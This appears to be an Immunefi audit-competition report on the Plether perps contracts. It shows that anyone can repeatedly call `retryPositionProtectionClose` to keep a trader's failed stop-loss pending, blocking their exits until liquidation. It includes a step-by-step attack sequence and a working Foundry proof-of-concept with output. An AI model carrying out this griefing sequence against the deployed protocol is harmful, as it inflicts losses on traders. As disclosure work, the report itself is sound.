# \#99326 [SC-High] Permissionless protection retry lets anyone repeatedly revoke a trader's amendment window and keep a failed stop-loss position open

**Submitted on Nov 13th 2026 at 07:06:20 UTC by @gzeon for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99326
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

`PositionProtectionBook.retryPositionProtectionClose` has no caller check. Once a stop-loss has triggered, the trader can neither commit an order nor cancel the protection, and the one state in which they may amend its close limits, `Latched` with no pending attempt, is a state any third party can erase by calling `retryPositionProtectionClose`. When the stored `closeLimits` make the generated close fail at execution, an unauthenticated caller who re-queues the attempt once per second keeps the position open and fully exposed for as long as they pay gas. The trader cannot close, cancel the protection or amend its limits while the attempt is pending. At release parameters the PoC turns a stop-loss that costs 2,081 USDG in the control run into a 5,000 USDG liquidation on a 100,000 USDG position.

## Vulnerability Details

Commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, `packages/perps/src`.

1. Every public order commit is blocked while any protection is active. `router/OrderLiquidationBatchLogic.sol:135` passes `enforceProtectionLock = true` for `commitOrder`, and `_validateFreshRequest` (`router/OrderLiquidationBatchLogic.sol:313-315`) reverts with `OrderRouter__ProtectionActive` when `activePositionProtectionId(account) != 0`. The lock does not distinguish `Armed`, `Triggered` or `Latched`.

2. The owner's exits only work in two states. `_cancel` (`PositionProtectionBook.sol:408-429`) accepts `PendingOpen` and `Armed`, so both `cancelPositionProtection` and `cancelPositionProtectionAndCommitClose` revert with `OrderRouter__ProtectionNotArmed` once the stop has triggered. `amendLatchedPositionProtectionCloseLimits` (`PositionProtectionBook.sol:315-328`) requires `Latched` and `pendingOrderCounts(msg.sender) == 0`.

3. Re-queuing is permissionless. `retryPositionProtectionClose` (`PositionProtectionBook.sol:382-406`) loads the protection with `_activeProtection`, not `_ownedActiveProtection`, and moves `Latched` back to `Triggered` with a fresh zero-bounty close attempt carrying the same stored `closeLimits`.

```solidity
// PositionProtectionBook.sol:382-389
function retryPositionProtectionClose(uint64 protectionId) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    _requireMatchingPosition(protection);
```

```solidity
// PositionProtectionBook.sol:315-325
function amendLatchedPositionProtectionCloseLimits(uint64 protectionId, CloseFinancialLimits calldata limits) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
```

A failed attempt relatches instead of terminating: `handleFailedProtectionAttempt` (`PositionProtectionBook.sol:637-676`) sets `Latched` whenever the position still matches, for every failure reason except `RiskOff` and `AccountLiquidated`, including `ConstraintViolation` against the owner's own limits.

The attempt fails whenever the execution-time charge exceeds the limits stored for the protection. The limits are absolute USDG amounts (`closeFinancialLimits`, set at creation, replaceable only while `Armed`), while the close fee is `executionFeeBps` of the notional at execution (`CfdOrderPolicyEvaluatorBase.sol:416`, `explicitFeesAssets = executionFeeAssets + frozenSpreadAssets`, enforced at `:514-516`). A LONG stop-loss triggers after the basket has risen, so in the PoC any execution price above the 1.01 trigger exceeds the 40.40 USDG fee ceiling. In oracle-frozen mode the 50 bps `frozenCloseSpreadBps` is added to `explicitFeesAssets`, which takes the charge from 4 bps to 54 bps of notional and exceeds any ceiling sized for the live fee.

This is the residue of the Cecuro MED-9 fix. MED-9 reported that keepers could trigger or retry protection closes without the trader's financial limits. The fix (`8a2853f8` on `Plether-Fi/plether-core`, `eadc5c58` / #124 in this repository, 2026-10-23) copies the trader's ceilings into every attempt and adds `amendLatchedPositionProtectionCloseLimits` as the owner's recovery path; the team's MED-9 response states that tight limits may prevent execution "until conditions improve or the owner amends them". The permissionless retry had existed since `5661cc55` (2026-08-29). The combination leaves the owner's recovery path revocable by anyone: the amend requires `Latched` with no pending attempt, and a single `retryPositionProtectionClose` call from any address ends that state.

Attack sequence:

1. Victim arms a stop-loss with a fee ceiling below the charge at the trigger.
2. Attacker triggers it through `triggerPositionProtection` once the mark crosses, and collects the trigger bounty.
3. Attacker executes the attempt. It fails `ConstraintViolation` and the Book relatches.
4. Attacker calls `retryPositionProtectionClose` in the same transaction. The new attempt has `commitTime == block.timestamp`, and in live and FAD mode `OrderRouterExecutionSidecar.sol:447-452` returns `SameBlock` or `MevBoundary` until a tick with a later publish time exists, so nobody can execute it before the next second.
5. At the next second the attacker repeats steps 3 and 4 before anyone else. Orders of other accounts queued ahead in the global FIFO are executed by ordinary keepers once their post-commit tick exists, after which the attacker's pair runs on the victim's attempt.

The victim has no admissible exit for as long as the attempt is pending: `commitOrder` reverts `ProtectionActive`, both cancel paths revert `ProtectionNotArmed`, `amendLatchedPositionProtectionCloseLimits` reverts `ProtectionNotLatched`, and `executeOrder` on the fresh attempt returns `Pending`. `CfdEngine.addMargin` (`CfdEngine.sol:501`) remains available but does not exit the position. To get out the victim must execute the pending attempt (which relatches) and then amend the limits before the attacker's next retry. `amendLatchedPositionProtectionCloseLimits` checks `msg.sender == protection.account` through `_ownedActiveProtection`, so an externally owned account cannot bundle the execute and the amend into one transaction, and the PoC shows one attacker retry landing between the two re-locks the protection. A contract account can bundle execute, amend and retry, but the bundle can only land once a later tick exists, in the same second in which the attacker's execute-and-retry is submitted. The exit is a sequencer-ordering race at every second boundary for as long as the attacker keeps paying. In oracle-frozen mode the gates at `:447-452` do not apply (`!request.oracleFrozen`), so the same race runs every block; the PoC exercises live mode.

`SECURITY.md:547-553` documents that retry is permissionless and that liveness depends on keepers appending a retry; `SECURITY.md:1357-1359` treats a prolonged `Latched` state without a live child as the hazard. Neither covers a caller keeping a doomed child live so that `Latched` never persists outside the attacker's own transaction.

The code is unchanged on `Plether-Fi/plether-core` master (`6909f261`) as of 2026-11-10.

## Impact Details

Impact in scope: `Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)` (Medium).

Measured in the PoC at the DEPLOYMENT.md release parameters (maintenance margin 10 bps, FAD margin 300 bps, execution fee 4 bps, liquidation charge 10 bps, vpiFactor 0.01e18):

- Two runs from the same fixture state: a 100,000 USDG LONG at 5% margin arms a stop-loss 1% above entry. In the control run the fee ceiling is unlimited; in the attack run it is the 40.00 USDG creation-time close fee plus 1% (40.40 USDG). The PoC uses the +1% ceiling to fail on a 2% gap in one step; a ceiling sized at several times the live fee fails the same way once the attempt executes in frozen mode (54 bps against 4 bps) or once accrued carry lifts the action charge above its cap.
- The basket gaps 2% up. In the control run the stop closes the position for a 2,081.20 USDG loss. In the attack run the attempt fails on the ceiling, relatches, and the attacker re-queues it every second.
- The basket reaches +5%. The locked victim is liquidated for a 5,000.40 USDG loss: the 5,000 USDG margin plus the two 0.20 USDG bounties. The measured incremental loss against the control is 2,919.20 USDG on a 100,000 USDG position.
- Each attacker cycle (one `executeOrder` that fails plus one `retryPositionProtectionClose`) costs 1,143,538 to 1,143,542 gas in the three measured rounds with the repository's `MockPyth` payloads, one cycle per second. At one cycle per second a ten-minute lock is 600 cycles; the PoC runs three.
- The same lock is deterministic against the calendar. The PoC asserts at +2% that the position is not liquidatable at the 10 bps live requirement and is liquidatable at the 300 bps FAD requirement (PnL pledge 4,810.10 USDG after the open fee, open VPI and liquidation reserve, equity about 2,810 USDG or 2.76% of the 102,000 USDG notional against a 3,060 USDG requirement), so a lock held into the Friday 16:30 New York FAD window makes the account liquidatable with no further price move.

The attacker needs ETH for gas and Pyth update data, no USDG and no position. Any triggered protection whose `maxExplicitFeesAssets`, `maxActionChargeAssets` or `maxGrossAccountDebitAssets` is exceeded at execution, whether from the higher trigger notional, accrued carry or the 50 bps frozen spread, is affected.

## References

- `packages/perps/src/PositionProtectionBook.sol:315-328` (`amendLatchedPositionProtectionCloseLimits`), `:382-406` (`retryPositionProtectionClose`), `:408-429` (`_cancel`), `:637-676` (`handleFailedProtectionAttempt`), `:983-991` (`_ownedActiveProtection`)
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol:135`, `:313-315` (protection lock on every public commit)
- `packages/perps/src/CfdOrderPolicyEvaluatorBase.sol:416`, `:514-516` (close fee ceiling enforcement)
- `packages/perps/src/OrderRouterExecutionSidecar.sol:447-452` (same-block and post-commit tick gates that make a fresh attempt unexecutable in its commit second)
- `packages/perps/src/CfdEngine.sol:501` (`addMargin`, the one engine action left to the victim)
- `packages/perps/SECURITY.md:547-553` (retry documented as permissionless; liveness limitation only)
- Cecuro AI audit 2026-10-26, MED-9 (fix `8a2853f8` upstream, `eadc5c58` / #124 here); retry and `Latched` introduced in `5661cc55`

## Proof of Concept

## Proof of Concept

Runs in the repository's Foundry suite at `a82d4fefb02768e5b3bddcc97dee371eee24fea8` with no change to any in-scope contract. Test assistance, all from the repository's own fixture. `BasePerpTest` deploys the production contracts behind its `LegacyOrderRouterHarness` subclass of `OrderRouter`; the PoC uses only the production V3 entrypoints. The release risk parameters are set through the fixture's `_riskParams` hook. `MockSettlementToken` stands in for USDG and `_fundTrader` mints 20,000 of it to the trader. `MockPyth` serves synthetic signed ticks, so the measured gas excludes real Pyth calldata and verification. `vm.deal` funds the attacker's gas, `vm.prank` selects the actor, and `vm.roll` and `vm.warp` advance blocks and seconds. Positions are opened through the public Router (`commitOrder` then `executeOrder`). Save the file as `packages/perps/test/perps/PoCProtectionRetryLock.t.sol` and run:

```
cd packages/perps
FOUNDRY_VIA_IR=false FOUNDRY_OUT=out-ci-fast FOUNDRY_CACHE_PATH=cache-ci-fast forge test --offline --match-path 'test/perps/PoCProtectionRetryLock.t.sol' --skip script -vv
```

The default via-IR profile gives the same result. Output:

```
Ran 2 tests for test/perps/PoCProtectionRetryLock.t.sol:PoCProtectionRetryLock
[PASS] test_PoC_control_stopLossClosesAtTrigger() (gas: 4470086)
Logs:
  control: stop-loss closed at +2%, loss (USDG atoms) 2081200042
[PASS] test_PoC_permissionlessRetryLocksProtectedTrader() (gas: 9321654)
Logs:
  close fee at creation (USDG atoms) 40000000
  victim fee ceiling (USDG atoms) 40400000
  pnl pledge after open (USDG atoms) 4810099787
  victim status after trigger (3=Triggered) 3
  at +2%: not liquidatable at 10 bps, liquidatable at the 300 bps FAD requirement
  victim attempt terminal reason (8=ConstraintViolation) 8
  victim status after failed attempt (8=Latched) 8
  victim status after attacker retry (3=Triggered) 3
  victim: execute stays pending; amend, cancel, cancel+close and commit all revert
  attacker gas for execute + retry 1143538
  attacker gas for execute + retry 1143540
  attacker gas for execute + retry 1143542
  victim: own execute then amend as two transactions loses to one attacker retry in between
  victim status after liquidation (7=Liquidated) 7
  victim loss after liquidation (USDG atoms) 5000400000
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 18.27ms (16.38ms CPU time)
Ran 1 test suite in 19.15ms (18.27ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

Test file:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {ICfdEnginePlanner} from "@plether/perps/interfaces/ICfdEnginePlanner.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice PoC: a permissionless caller keeps a protected trader locked out of closing, cancelling and amending by
///         re-queuing a failing stop-loss attempt. Release risk parameters; runs in the repo suite at a82d4fef
///         without modifying any in-scope contract.
contract PoCProtectionRetryLock is BasePerpTest {

    address internal constant VICTIM = address(0xA11CE);
    address internal constant ATTACKER = address(0xBAD);
    uint256 internal constant SIZE = 1e23; // 1,000 lots: 100,000 USDG notional at a 1.00 basket price
    uint256 internal constant MARGIN = 5_000e6; // 5%
    uint256 internal constant FUNDING = 20_000e6;

    IPositionProtectionActions internal actions;
    IPositionProtectionViews internal views;

    /// @dev DEPLOYMENT.md release parameters.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        actions = IPositionProtectionActions(address(router.positionProtectionBook()));
        views = IPositionProtectionViews(address(router.positionProtectionBook()));
        router.updateMarkPrice(_liveTicks(1e8));
    }

    /// @dev One signed live tick per feed at the next second so the Router can refresh the mark. Block fields are
    ///      read through cheatcodes because the optimizer treats them as constant within one test transaction.
    function _liveTicks(uint256 price) internal returns (bytes[] memory data) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = vm.getBlockTimestamp();
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, publishTime, 0));
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    function _status(uint64 id) internal view returns (uint8) {
        return uint8(views.getPositionProtection(id).status);
    }

    function _positionSize(address account) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    /// @dev Exact price-risk test the engine uses, at a caller-chosen margin requirement (10 bps live, 300 bps FAD).
    function _liquidatableAt(address account, uint256 price, uint256 requiredBps) internal view returns (bool) {
        CfdTypes.Position memory pos;
        (pos.size, pos.margin, pos.entryPrice, pos.maxProfitAssets, pos.side, pos.lastUpdateTime, pos.vpiAccrued) =
            engine.positions(account);
        uint256 collateral = clearinghouse.pnlPledgeAssets(account) + engine.traderClaimBalanceAssets(account);
        return ICfdEnginePlanner(engine.planner()).isExactPriceRiskLiquidatable(
            pos, engine.positionEntryCostAssetAtoms(account), price, engine.CAP_PRICE(), collateral, requiredBps
        );
    }

    /// @dev Opens through the public Router: commit a bounded V3 open, then any keeper executes it.
    function _openThroughRouter(address account, bytes32 clientId) internal {
        _fundTrader(account, FUNDING);
        OrderV3Types.OrderRequest memory request = _request(clientId, false, 0.99e8, MARGIN);
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        OrderV3Types.ExecutionResult memory res = router.executeOrder(orderId, _mockPythUpdateData(1e8));
        assertEq(uint8(res.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open executed");
        assertEq(_positionSize(account), SIZE, "position open");
    }

    function _protect(address account, uint256 maxExplicitFeesAssets) internal returns (uint64 id) {
        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = 1.01e8;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: maxExplicitFeesAssets
        });
        vm.prank(account);
        id = actions.createPositionProtection(params);
    }

    /// @dev Control: identical position and stop-loss, unlimited fee ceiling. The stop closes the position at +2%.
    function test_PoC_control_stopLossClosesAtTrigger() public {
        _openThroughRouter(VICTIM, bytes32(uint256(0xA11CE)));
        router.updateMarkPrice(_liveTicks(1e8));
        uint64 id = _protect(VICTIM, type(uint256).max);
        vm.deal(ATTACKER, 1 ether);
        vm.prank(ATTACKER);
        uint64 attempt = actions.triggerPositionProtection(id, _liveTicks(1.02e8));
        OrderV3Types.ExecutionResult memory res = router.executeOrder(attempt, _mockPythUpdateData(1.02e8));
        assertEq(uint8(res.status), uint8(OrderV3Types.LifecycleStatus.Executed), "stop closed");
        assertEq(_positionSize(VICTIM), 0, "flat");
        console2.log("control: stop-loss closed at +2%, loss (USDG atoms)", FUNDING - clearinghouse.balanceAssets(VICTIM));
    }

    function test_PoC_permissionlessRetryLocksProtectedTrader() public {
        // 1. A 100,000 USDG LONG at 5% margin arms a stop-loss 1% above entry with a fee ceiling of the creation-time
        //    close fee plus 1%.
        _openThroughRouter(VICTIM, bytes32(uint256(0xA11CE)));
        router.updateMarkPrice(_liveTicks(1e8));
        uint256 feeAtCreation = _engineExecutionFeeAssets(SIZE, 1e8);
        uint64 victimId = _protect(VICTIM, feeAtCreation * 101 / 100);
        console2.log("close fee at creation (USDG atoms)", feeAtCreation);
        console2.log("victim fee ceiling (USDG atoms)", feeAtCreation * 101 / 100);
        console2.log("pnl pledge after open (USDG atoms)", clearinghouse.pnlPledgeAssets(VICTIM));

        // 2. The basket gaps 2% up. The attempt fails on the ceiling and relatches; the attacker re-queues it.
        vm.deal(ATTACKER, 1 ether);
        vm.prank(ATTACKER);
        uint64 attempt = actions.triggerPositionProtection(victimId, _liveTicks(1.02e8));
        console2.log("victim status after trigger (3=Triggered)", _status(victimId));
        assertFalse(_liquidatableAt(VICTIM, 1.02e8, 10), "healthy at the live 10 bps requirement");
        assertTrue(_liquidatableAt(VICTIM, 1.02e8, 300), "already below the 300 bps FAD requirement at +2%");
        console2.log("at +2%: not liquidatable at 10 bps, liquidatable at the 300 bps FAD requirement");
        bytes[] memory fill = _mockPythUpdateData(1.02e8);
        vm.startPrank(ATTACKER);
        OrderV3Types.ExecutionResult memory res = router.executeOrder(attempt, fill);
        console2.log("victim attempt terminal reason (8=ConstraintViolation)", uint8(res.terminalReason));
        console2.log("victim status after failed attempt (8=Latched)", _status(victimId));
        uint64 retry = actions.retryPositionProtectionClose(victimId);
        vm.stopPrank();
        console2.log("victim status after attacker retry (3=Triggered)", _status(victimId));

        // 3. Same second: every victim exit reverts or stays pending.
        PositionProtectionTypes.CloseFinancialLimits memory wide = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
        OrderV3Types.OrderRequest memory manualClose = _request(bytes32(uint256(0xC105E)), true, 0, 0);
        vm.startPrank(VICTIM);
        res = router.executeOrder(retry, fill);
        assertEq(uint8(res.status), uint8(OrderV3Types.LifecycleStatus.Pending), "fresh attempt cannot execute yet");
        assertTrue(
            res.pendingReason == OrderV3Types.PendingReason.SameBlock
                || res.pendingReason == OrderV3Types.PendingReason.HistoricalPriceUnavailable,
            "no tick after the retry commit"
        );
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        actions.amendLatchedPositionProtectionCloseLimits(victimId, wide);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        actions.cancelPositionProtection(victimId);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        actions.cancelPositionProtectionAndCommitClose(victimId, manualClose);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(manualClose);
        vm.stopPrank();
        console2.log("victim: execute stays pending; amend, cancel, cancel+close and commit all revert");

        // 4. Each later second the attacker lands [execute -> Latched, retry] first and the victim is boxed out again.
        for (uint256 round; round < 3; ++round) {
            fill = _mockPythUpdateData(1.02e8);
            vm.startPrank(ATTACKER);
            uint256 gasBefore = gasleft();
            router.executeOrder(retry, fill);
            retry = actions.retryPositionProtectionClose(victimId);
            console2.log("attacker gas for execute + retry", gasBefore - gasleft());
            vm.stopPrank();
            vm.prank(VICTIM);
            res = router.executeOrder(retry, fill);
            assertEq(uint8(res.status), uint8(OrderV3Types.LifecycleStatus.Pending), "boxed out");
            vm.prank(VICTIM);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            actions.amendLatchedPositionProtectionCloseLimits(victimId, wide);
        }

        // 5. Even when the victim's own execute lands first, the amend is a second transaction for an EOA, and the
        //    attacker's retry between the two re-locks the protection.
        fill = _mockPythUpdateData(1.02e8);
        vm.prank(VICTIM);
        res = router.executeOrder(retry, fill);
        assertEq(uint8(_status(victimId)), 8, "victim relatched it herself");
        vm.prank(ATTACKER);
        retry = actions.retryPositionProtectionClose(victimId);
        vm.prank(VICTIM);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        actions.amendLatchedPositionProtectionCloseLimits(victimId, wide);
        console2.log("victim: own execute then amend as two transactions loses to one attacker retry in between");
        assertEq(_positionSize(VICTIM), SIZE, "position never closed");
        assertEq(router.pendingOrderCounts(VICTIM), 1, "an attacker-queued attempt is always pending");

        // 6. The basket keeps rising to +5%. The locked victim is liquidated.
        router.executeLiquidation(VICTIM, _liveTicks(1.05e8));
        assertEq(_positionSize(VICTIM), 0, "liquidated");
        console2.log("victim status after liquidation (7=Liquidated)", _status(victimId));
        console2.log("victim loss after liquidation (USDG atoms)", FUNDING - clearinghouse.balanceAssets(VICTIM));
    }

    function _request(bytes32 clientId, bool isClose, uint256 targetPrice, uint256 marginDelta)
        internal
        view
        returns (OrderV3Types.OrderRequest memory request)
    {
        request.clientOrderId = clientId;
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = SIZE;
        request.marginDelta = marginDelta;
        request.targetPrice = isClose ? type(uint256).max : targetPrice;
        request.isClose = isClose;
        request.bounds.submitBy = uint64(vm.getBlockTimestamp() + 60);
        request.bounds.executionWindowSeconds = 60;
        request.bounds.allowedExecutionModes = 7;
        request.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        request.bounds.maxExecutionBountyAssets = type(uint256).max;
        request.bounds.maxExecutionNotionalAssets = type(uint256).max;
        request.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        request.bounds.maxActionChargeAssets = type(uint256).max;
        request.bounds.maxExplicitFeesAssets = type(uint256).max;
        request.bounds.maxPostPositionSize = type(uint256).max;
        request.bounds.maxPostLeverageBps = type(uint32).max;
    }

}
```
